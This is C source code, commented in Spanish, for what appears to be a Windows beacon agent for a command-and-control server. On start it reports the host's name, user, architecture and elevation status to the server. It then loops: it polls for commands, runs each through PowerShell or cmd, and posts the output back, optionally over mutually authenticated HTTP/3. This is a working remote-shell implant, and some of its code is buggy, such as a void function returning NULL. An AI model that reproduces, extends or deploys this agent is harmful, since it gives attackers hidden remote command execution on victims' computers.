#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>


// gcc -DAGENT_ID="agent-1" -DCOMMAND_URL="http://localhost:8080/agent-1/cmd" -DBEACON_INTERVAL=2 -o agent agent.c -lcurl

#ifndef AGENT_ID
    #define AGENT_ID "02bfcf7f-30e6-492c-b074-0a213e93df3c/1"
#endif

#ifndef NEW_URL
    #define NEW_URL "http://localhost:8080/02bfcf7f-30e6-492c-b074-0a213e93df3c/1/new"
#endif

#ifndef COMMAND_URL
    #define COMMAND_URL "http://localhost:8080/02bfcf7f-30e6-492c-b074-0a213e93df3c/1/cmd"
#endif

#ifndef BEACON_INTERVAL
    #define BEACON_INTERVAL 2
#endif

#ifndef TYPE
    #define TYPE "HTTP"
#endif

// Estructura utilizada para almacenar los datos de respuesta
struct response_data {
    char *buffer;   // Puntero al búfer de datos de respuesta
    size_t size;    // Tamaño actual del búfer
};

//* Esta función se utiliza como callback para la función de escritura de curl_easy_setopt. 
// @param ptr: el puntero al búfer de datos recibido
// @Param size: el tamaño de cada elemento en el búfer
// @Param nmemb: el número de elementos en el búfer
// @Param userdata: un puntero a la estructura de datos de respuesta
// @Return: el número de bytes escritos al búfer
size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata);

//* Esta función se utiliza para obtener los comandos en cola para el agente de este agente.
// @Param curl: un puntero a una instancia de CURL inicializada
// @Return: un puntero al búfer de datos recibido, o NULL si se produjo un error
char *get_commands(CURL *curl);

//* Esta función se utiliza para ejecutar un comando de PowerShell y devolver su salida.
// @Param command: el comando de PowerShell para ejecutar
// @Return: un puntero a la cadena de salida del comando, o NULL si se produjo un error
char *execute_powershell_command(const char *command);

//* Esta función se utiliza para obtener el modo de comando (cmd o ps1) del comando recibido.
// @Param command: el comando para analizar
// @Return: un puntero a la cadena que contiene el modo de comando (cmd o ps1)
char *get_mode(char *command);

//* Esta función se utiliza para enviar la salida de un comando al servidor.
// @Param output: la salida del comando a enviar
// @Param command: el comando que generó la salida
void send_output(char *output, char *command);

//* Esta función se utiliza para agregar un prefijo 'cmd /c' al comando.
// @Param command: un puntero al comando a modificar
void addPrefixCmd(char **command);

//* Esta función se ejecuta al inicio para enviar la información del agente al servidor.
// @Param curl: un puntero a una instancia de CURL inicializada
void sendInfoStart(CURL *curl);

//* Esta función se utiliza para crear los ficheros de certificados y claves.
void createCertificates();

//* Base64 decode */

//* Esta función se utiliza para obtener el valor índice de un carácter en la tabla de codificación base64.
// @Param value: el carácter para buscar en la tabla de codificación base64
// @Return: el valor índice del carácter en la tabla de codificación base64
int inverseEncodeTable(char value);

//* Esta función se utiliza para decodificar una cadena de texto codificada en base64.
// @Param input: la cadena de entrada que contiene el mensaje codificado en base64
// @Param input_size: el tamaño de la cadena de entrada
// @Param output_size: un puntero a una variable que almacenará el tamaño del mensaje decodificado
// @Return: un puntero a la cadena de caracteres decodificada
char *decode_base64(const char *input, size_t input_size, size_t *output_size);

int main(int argc, char *argv[]) { 
    
    char *output;	

    printf("Enviando datos a: %s", NEW_URL);

    curl_global_init(CURL_GLOBAL_ALL); // Inicializar librería curl
    CURL *curl = curl_easy_init(); // Inicializar una instancia de curl

    if (curl){
   
        #ifdef SERVER_CERT
            createCertificates();
        #endif

        // Recopila información del agente y la envía al servidor
        sendInfoStart(curl);

        while (1) {

            sleep(BEACON_INTERVAL); // Esperar 2 segundos antes de enviar otro beacon

            char *command = get_commands(curl);
            
            printf("\n\nComando: %s\n", command);

            if (command == NULL || strcmp(command, "NA NA") == 0) {
                continue;
            }

            char *mode = get_mode(command);

            printf("Modo: %s\n", mode);

            if(strcmp(mode, "cmd")==0){
                addPrefixCmd(&command);
            }

            printf("Comando2: %s\n", command);

            char *output = execute_powershell_command(command);

            printf("Output: %s\n", output);

            send_output(output, command);

            free(output);

        }

        curl_easy_cleanup(curl); // Limpiar la instancia de curl

    }

    curl_global_cleanup(); // Limpiar la librería curl

    return 0;
}

void createCertificates(){

    // Crea los certificados y claves para el servidor
    // Certificados y claves creados en la carpeta del ejecutable
    // Certificados y claves creados con OpenSSL

    // El certificado del servidor está en formato PEM en SERVER_CERT en base64
    // La clave privada de la app está en formato PEM en KEY en base64
    // El certifiado de la app está en formato PEM en CERT en base64

   
#ifdef CERT

    size_t server_cert_size, cert_size, key_size;

     // Escribo en server_cert.pem el certificado del servidor
    FILE *server_cert = fopen("server_cert.pem", "w");
    fprintf(server_cert, "%s", decode_base64(SERVER_CERT, strlen(SERVER_CERT), &server_cert_size));
    fclose(server_cert);

    // Escribo en cert.pem el certificado de la app
    FILE *cert = fopen("cert.pem", "w");
    fprintf(cert, "%s", decode_base64(CERT, strlen(CERT), &cert_size));
    fclose(cert);

    // Escribo en key.pem la clave privada de la app
    FILE *key = fopen("key.pem", "w");
    fprintf(key, "%s", decode_base64(KEY, strlen(KEY), &key_size));
    fclose(key);

#endif

}


void sendInfoStart(CURL *curl){

    // Recopila información del agente y la envía al servidor
    // Información que recopila: hostname, username, os, arquitectura y is_root (nt_system, bool)
    char hostname[1024];
    DWORD hostname_len = 1024;
    GetComputerName(hostname, &hostname_len);

    char username[1024];
    DWORD username_len = 1024;
    GetUserName(username, &username_len);

    char os[11];
    snprintf(os, sizeof(os), "%s", "Windows 11");

    char arch[10];
    snprintf(arch, sizeof(arch), "%s", sizeof(void *) == 4 ? "x86" : "x64");

    int is_root = 0;
    HANDLE token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            is_root = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }

    char buffer[1024];
    snprintf(buffer, sizeof(buffer), "%s\n%s\n%s\n%s\n%d", hostname, username, os, arch, is_root);

    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();

  

    curl_easy_setopt(curl, CURLOPT_URL, NEW_URL);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buffer);

    
    #ifdef SERVER_CERT // Si se ha definido SERVER_CERT, se configura los certificados y claves QUIC

    const char *cert = "cert.pem";
    const char *key = "key.pem";
    const char *cacert = "server_cert.pem";

    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    
    // Configurar el protocolo HTTP/3 (QUIC)
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, (long)CURL_HTTP_VERSION_3);

    // Configurar el certificado del servidor, el certificado de la app y la clave privada de la app
    curl_easy_setopt(curl, CURLOPT_CAINFO, "server_cert.pem");
    curl_easy_setopt(curl, CURLOPT_SSLCERT, "cert.pem");
    curl_easy_setopt(curl, CURLOPT_SSLKEY, "key.pem");

    #endif

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        return NULL;
    }

    printf("Información del agente enviada al servidor\n");

    

}

size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t realsize = size * nmemb;
    struct response_data *data = (struct response_data *)userdata;
    data->buffer = realloc(data->buffer, data->size + realsize + 1);
    if (data->buffer == NULL) {
        fprintf(stderr, "Error: memoria insuficiente\n");
        return 0;
    }
    memcpy(data->buffer + data->size, ptr, realsize);
    data->size += realsize;
    data->buffer[data->size] = '\0';

    return realsize;
}

char *get_commands(CURL *curl) {

    curl_easy_reset(curl);

    CURLcode res;

    struct curl_slist *headers = NULL;
    struct response_data data = {0};

    // Inicializar data.buffer con NULL
    data.buffer = NULL;


    headers = curl_slist_append(headers, "Content-Type: text/plain");
    
    curl_easy_setopt(curl, CURLOPT_URL, COMMAND_URL);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

    #ifdef SERVER_CERT // Si se ha definido SERVER_CERT, se configura el certificado del servidor

        printf("\nclIntentando la conexión con el servidor (HTTP/3)... [%s]\n", COMMAND_URL);

        const char *cacert = "server_cert.pem";
        // Configurar el protocolo HTTP/3 (QUIC)
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, (long)CURL_HTTP_VERSION_3);
        // Configuramos el certificado del servidor
        curl_easy_setopt(curl, CURLOPT_CAINFO, cacert);
        // Habilitar el modo verbose
        
    #endif

    printf("\nOpciones preparadas, lanzando curl...\n");
    
    res = curl_easy_perform(curl);
    
    printf("\nCurl finalizado\n");

    if (res != CURLE_OK) {
        fprintf(stderr, "Error: curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
        free(data.buffer);
        return NULL;
    }
    
    curl_slist_free_all(headers);

    // add /0 to the end of the string
    data.buffer[data.size] = '\0';

    return data.buffer;
}


char *get_mode(char *command) {
    char *word_end = strstr(command, " ");
    if (word_end == NULL) {
        return NULL;
    }
    char *word = malloc(word_end - command + 1);
    if (word == NULL) {
        return NULL;
    }
    memcpy(word, command, word_end - command);
    word[word_end - command] = '\0';
    memmove(command, word_end + 1, strlen(word_end + 1) + 1);
    return word;
}



void addPrefixCmd(char **command) {
    const char *prefix = "cmd /c ";
    size_t prefix_len = strlen(prefix);
    size_t old_len = strlen(*command);

    // Reasignamos la memoria para ajustar el espacio para el prefijo y el carácter nulo
    char *new_command = (char *)realloc(*command, prefix_len + old_len + 1);
    if (new_command == NULL) {
        // Si realloc falla, liberamos la memoria anterior y terminamos la ejecución
        free(*command);
        fprintf(stderr, "Error al reasignar memoria.\n");
        exit(EXIT_FAILURE);
    }

    // Mover los caracteres existentes hacia adelante en la nueva ubicación de memoria
    memmove(new_command + prefix_len, new_command, old_len + 1);

    // Copiamos el prefijo al comienzo de la nueva cadena
    strncpy(new_command, prefix, prefix_len);

    // Asignamos el puntero de la cadena nueva al puntero original
    *command = new_command;
}


char *execute_powershell_command(const char *command) {
    char *response = NULL;
    FILE *fp;
    char buffer[4096];
    size_t size = 0;

    // Construye el comando de PowerShell
    char powershell_command[4096];
    snprintf(powershell_command, sizeof(powershell_command), "powershell.exe -Command \"%s\"", command);

    fp = popen(powershell_command, "r");
    if (fp == NULL) {
        fprintf(stderr, "Error: no se pudo abrir la tubería al shell de PowerShell\n");
        return NULL;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t len = strlen(buffer);
        response = realloc(response, size + len + 1);
        if (response == NULL) {
            fprintf(stderr, "Error: no se pudo asignar memoria para la respuesta\n");
            pclose(fp);
            return NULL;
        }
        memcpy(response + size, buffer, len);
        size += len;
    }

    response[size-1] = '\0';
    pclose(fp);
    return response;
}

void send_output(char *output, char *command) {
    printf("Enviando output");

    // Estimar el tamaño necesario para la cadena JSON resultante
    size_t data_length = strlen("%s\n\n%s") + strlen(command) + strlen(output) + 1;
    //size_t json_length = strlen("{\"command\":\"%s\",\"output\":\"%s\"}") + strlen(command) + strlen(output) + 1;

    // Crear un búfer para la cadena JSON
    char *data_str = (char *)malloc(data_length * sizeof(char));

    // Crear la cadena JSON utilizando snprintf
    if (data_str) {
        snprintf(data_str, data_length, "%s\n\n%s", command, output);

    } else {
        printf("Error: No se pudo asignar memoria para la cadena.\n");
    }

    printf("Data: %s", data_str);

    // Ahora envio el json
    CURL *curl;
    CURLcode res;

    /* In windows, this will init the winsock stuff */ 
    curl_global_init(CURL_GLOBAL_ALL);

    /* get a curl handle */ 
    curl = curl_easy_init();
    if(curl) {
        /* First set the URL that is about to receive our POST. This URL can
        just as well be a https:// URL if that is what should receive the
        data. */ 
        curl_easy_setopt(curl, CURLOPT_URL, COMMAND_URL);
        /* Now specify the POST data */ 
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data_str);

        /* Perform the request, res will get the return code */ 
        res = curl_easy_perform(curl);
        /* Check for errors */ 
        if(res != CURLE_OK)
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));

        /* always cleanup */ 
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();

    free(data_str);
}


//* Base64 decorder  //

const char encodeTable[64] = {
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};

int inverseEncodeTable(char value) {
    if (value == '=') {
        return -2;
    }
    for (int i = 0; i < 64; i++) {
        if (value == encodeTable[i]) {
            return i;
        }
    }
    return -1;
}

char *decode_base64(const char *input, size_t input_size, size_t *output_size) {
    char *output = NULL;
    *output_size = 0;

    int decodeBuffer[4] = {0};
    int paddingCount = 0;

    for (size_t i = 0; i < input_size; i++) {
        decodeBuffer[i % 4] = inverseEncodeTable(input[i]);

        if (decodeBuffer[i % 4] == -2) {
            paddingCount++;
            if (paddingCount >= 3) {
                fprintf(stderr, "Error: Demasiados caracteres de relleno, codificación base64 incorrecta.\n");
                return NULL;
            }
        } else if (decodeBuffer[i % 4] == -1) {
            fprintf(stderr, "Error: Valor inválido enviado a la tabla de decodificación.\n");
            return NULL;
        }

        if ((i % 4) == 3) {
            int processBuffer = 0;
            processBuffer = (processBuffer ^ (decodeBuffer[0] & 0b00111111)) << 6;
            processBuffer = (processBuffer ^ (decodeBuffer[1] & 0b00111111)) << 6;
            processBuffer = (processBuffer ^ (decodeBuffer[2] & 0b00111111)) << 6;
            processBuffer = processBuffer ^ (decodeBuffer[3] & 0b00111111);

            char conversionBuffer[3] = {0};
            conversionBuffer[0] = (processBuffer & 0b111111110000000000000000) >> 16;
            conversionBuffer[1] = (processBuffer & 0b000000001111111100000000) >> 8;
            conversionBuffer[2] = (processBuffer & 0b000000000000000011111111);

            *output_size += 3 - paddingCount;
            output = (char *)realloc(output, *output_size);
            for (int j = *output_size - 3 + paddingCount; j < *output_size; j++) {
                output[j] = conversionBuffer[j % 3];
            }

            if (paddingCount > 0) {
                break;
            }
        }
    }

    return output;
}